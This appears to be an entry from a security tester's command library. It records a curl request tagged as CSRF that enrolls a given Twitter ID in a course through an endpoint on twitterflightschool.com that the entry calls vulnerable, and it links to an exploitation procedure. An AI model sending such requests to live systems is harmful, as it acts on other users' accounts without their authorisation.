---
id: 62b7190a-50c9-46ca-9313-95ec50ca401b
name: enroll-in-course
type: command
executor: bash
data: >-
  curl -X POST
  https://twitterflightschool.com/api/users/track/EXAMPLE_COURSE_ID/enroll -H
  "Cookie: connect.sid=██████" -H "Content-Type:
  application/x-www-form-urlencoded" -d "twitterId=1192789765"
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:27:29.771Z'
platforms:
  - Web
tags:
  - csrf
  - enrollment
verified: false
validated: true
submitted: true
---

# enroll-in-course

## Command

```bash
curl -X POST https://twitterflightschool.com/api/users/track/EXAMPLE_COURSE_ID/enroll \
  -H "Cookie: connect.sid=██████" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "twitterId=1192789765"
```

## Description

Enrolls user in a course via vulnerable endpoint using twitterId and session.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-d "twitterId=..."` | User's Twitter ID | Yes |
| Path `/track/{COURSE_ID}` | Specific course identifier | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://twitterflightschool.com/api/users/track/123/enroll -d "twitterId=1192789765"
```

## Expected Output

HTTP 200 with enrollment success, e.g., {"enrolled": true}.

## Related

- [[procedures/Exploit-CSRF-to-Enroll-in-Courses]]
- [[commands/update-user-profile]]
